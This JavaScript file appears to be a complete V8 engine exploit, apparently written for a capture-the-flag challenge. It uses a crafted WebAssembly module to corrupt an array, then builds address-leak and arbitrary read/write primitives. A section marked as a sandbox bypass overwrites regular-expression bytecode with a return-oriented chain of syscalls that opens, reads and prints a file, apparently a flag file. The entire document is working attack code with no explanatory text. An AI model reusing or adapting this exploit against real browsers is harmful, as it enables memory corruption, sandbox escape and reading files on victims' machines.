new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
let arr = [
  3.6943953506820553047070760262e-311, 1.11253692992607195990269950621e-308,
  3.3, 4.4,
];
let float_arr = [1.1, 2.2];
let obj_arr = [arr, arr];

new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
let cor;

function ff(a, b, c, d, e, f, g, h, i, j, k, l, m, n) {
  postMessage("aaaa");
  cor = m;
  exp();

}


function exp() {
  var buf = new ArrayBuffer(8);
  var dv = new DataView(buf);
  var u8 = new Uint8Array(buf);
  var u32 = new Uint32Array(buf);
  var u64 = new BigUint64Array(buf);
  var f32 = new Float32Array(buf);
  var f64 = new Float64Array(buf);

  var f64toi64 = (f) => {
    f64[0] = f;
    return u64[0];
  };
  var i64tof64 = (f) => {
    u64[0] = f;
    return f64[0];
  };
  var ftoil = (f) => {
    f64[0] = f;
    return u32[0];
  };

  var ftoih = (f) => {
    f64[0] = f;
    return u32[1];
  };
  var hex = (i) => {
    return i.toString(16).padStart(16, "0");
  };

  var pair_i32_to_f64 = (p1, p2) => {
    u32[0] = p1;
    u32[1] = p2;
    return f64[0];
  };
  console.error("Length:", cor.length);

  function addrof(o) {
    obj_arr[0] = o;
    return ftoil(cor[0x1a7a]);
  }
  function aar(addr) {
    u32[0] = addr - 8;
    u32[1] = 0x4;
    cor[0x1a78] = f64[0];
    return float_arr[0];
  }

  function aaw(addr, value) {
    u32[0] = addr - 8;
    u32[1] = 0x4;
    cor[0x1a78] = f64[0];
    float_arr[0] = value;
  }
  ///////////////////
  // sandbox bypass now
  var s = "aaaaa";
  var regex =
    /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;
  var res1 = regex.exec(s);

  var addr_regex = addrof(regex);
  console.error("regex addr", hex(addr_regex));
  var data_addr = ftoil(aar(addr_regex + 0xc));
  console.error("data addr", hex(data_addr));

  var bytecode = ftoil(aar(data_addr + 0x1c));
  console.error("bytecode addr", hex(bytecode));

  aaw(data_addr + 0x30, pair_i32_to_f64(2, ftoih(aar(data_addr + 0x30))));

  var arr = [];
  function push_reg(idx) {
    arr.push(((idx << 8) & 0xffffff00) | 0x03);
  }

  function pop_reg(idx) {
    arr.push(((idx << 8) & 0xffffff00) | 0x0c);
  }

  function mov_reg1_to_reg2(idx1, idx2) {
    push_reg(idx1);
    pop_reg(idx2);
  }

  function advance_reg(idx, value) {
    arr.push(((idx << 8) & 0xffffff00) | 0x09);
    arr.push(value);
  }

  function set_reg(idx, value) {
    arr.push(((idx << 8) & 0xffffff00) | 0x08);
    arr.push(value);
  }

  function success() {
    arr.push(0x0000000e);
  }

  function add_gadget(addr) {
    mov_reg1_to_reg2(3, 5);
    advance_reg(5, addr);
    mov_reg1_to_reg2(5, idx++);
    mov_reg1_to_reg2(4, idx++);
  }

  var idx = 0x52;

  mov_reg1_to_reg2(0x53, 4);
  mov_reg1_to_reg2(0x52, 3);
  advance_reg(3, 0xfbe66f05);
  add_gadget(0x0d9c9ec1); // pop r14; ret;
  set_reg(idx++, 0x616c662f);
  set_reg(idx++, 0x6c662f67);
  add_gadget(0x0d9bfe5a); // pop rax; ret;
  add_gadget(0x0e30b000);
  add_gadget(0x0d95ecab); // mov qword ptr [rax+0x38], r14; pop rbx; pop r14; pop rbp; ret;
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  add_gadget(0x0d9c9ec1); // pop r14; ret;
  set_reg(idx++, 0x6761);
  set_reg(idx++, 0);
  add_gadget(0x0d9bfe5a); // pop rax; ret;
  add_gadget(0x0e30b008);
  add_gadget(0x0d95ecab); // mov qword ptr [rax+0x38], r14; pop rbx; pop r14; pop rbp; ret;
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);

  add_gadget(0x0d9cab47); // pop rdi; ret;
  add_gadget(0x0e30b000 + 0x38);
  add_gadget(0x0d9c9ec2); // pop rsi; ret;
  set_reg(idx++, 0);
  set_reg(idx++, 0);
  add_gadget(0x0d9bfe5a); // pop rax; ret;
  set_reg(idx++, 0x00000002);
  set_reg(idx++, 0);
  add_gadget(0x091ff0a1); // syscall; ret;

  add_gadget(0x0d9c9ec2); // pop rsi; ret;
  add_gadget(0x0e30b010 + 0x38);
  add_gadget(0x0a217c93); // mov rdi, rax; mov [rsi+8], rdi; pop rbp; ret;
  set_reg(idx++, 0xdeadbeef);
  set_reg(idx++, 0xdeadbeef);
  add_gadget(0x0d9cf582); // pop rdx; ret;
  set_reg(idx++, 0x80);
  set_reg(idx++, 0);
  add_gadget(0x0d9bfe5a); // pop rax; ret;
  set_reg(idx++, 0x00000000);
  set_reg(idx++, 0);
  add_gadget(0x091ff0a1); // syscall; ret;

  add_gadget(0x0d9cab47); // pop rdi; ret;
  set_reg(idx++, 2);
  set_reg(idx++, 0);
  add_gadget(0x0d9c9ec2); // pop rsi; ret;
  add_gadget(0x0e30b010 + 0x38);
  add_gadget(0x0d9cf582); // pop rdx; ret;
  set_reg(idx++, 0x80);
  set_reg(idx++, 0);
  add_gadget(0x0d9bfe5a); // pop rax; ret;
  set_reg(idx++, 0x00000001);
  set_reg(idx++, 0);
  add_gadget(0x091ff0a1); // syscall; ret;
  success();

  var bbuf = new ArrayBuffer((arr.length + 1) * 4);
  var bview = new DataView(bbuf);

  for (var i = 0; i < arr.length; i++) {
    bview.setUint32(i * 4, arr[i], true);
  }
  if (arr.length % 2 == 1) {
    bview.setUint32(arr.length * 4, 0, true);
  }

  u32[0] = bytecode;
  u32[1] = 0x400;
  cor[0x1a78] = f64[0];
  for (var i = 0; i < Math.floor(arr.length / 2 + 1); i++) {
    float_arr[i] = bview.getFloat64(i * 8, true);
  }

  console.error("exec!");
  var res = regex.exec(s);
}

function corrupt() {
  let wasmCode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 21, 2, 96, 14, 123, 124, 124, 124, 124, 124,
    124, 126, 126, 126, 126, 126, 108, 112, 0, 96, 0, 0, 2, 11, 1, 3, 109, 111,
    100, 3, 102, 111, 111, 0, 0, 3, 2, 1, 1, 7, 8, 1, 4, 109, 97, 105, 110, 0,
    1, 9, 5, 1, 3, 0, 1, 0, 10, 125, 1, 123, 1, 1, 100, 108, 253, 12, 0, 0, 224,
    221, 183, 213, 235, 65, 0, 0, 224, 221, 183, 213, 235, 65, 68, 154, 153,
    153, 153, 153, 153, 241, 63, 68, 154, 153, 153, 153, 153, 153, 241, 63, 68,
    154, 153, 153, 153, 153, 153, 241, 63, 68, 154, 153, 153, 153, 153, 153,
    241, 63, 68, 154, 153, 153, 153, 153, 153, 241, 63, 68, 209, 196, 20, 0, 0,
    0, 0, 0, 66, 187, 247, 238, 221, 11, 66, 187, 247, 238, 221, 11, 66, 187,
    247, 238, 221, 11, 66, 187, 247, 238, 221, 11, 66, 187, 247, 238, 221, 11,
    65, 170, 213, 170, 213, 122, 251, 28, 34, 0, 210, 0, 210, 0, 20, 0, 11, 0,
    14, 4, 110, 97, 109, 101, 1, 7, 1, 1, 4, 109, 97, 105, 110,
  ]);

  var wasmModule = new WebAssembly.Module(wasmCode);
  var instance = new WebAssembly.Instance(wasmModule, { mod: { foo: ff } });
  let f = instance.exports.main;
  f();
}

corrupt();
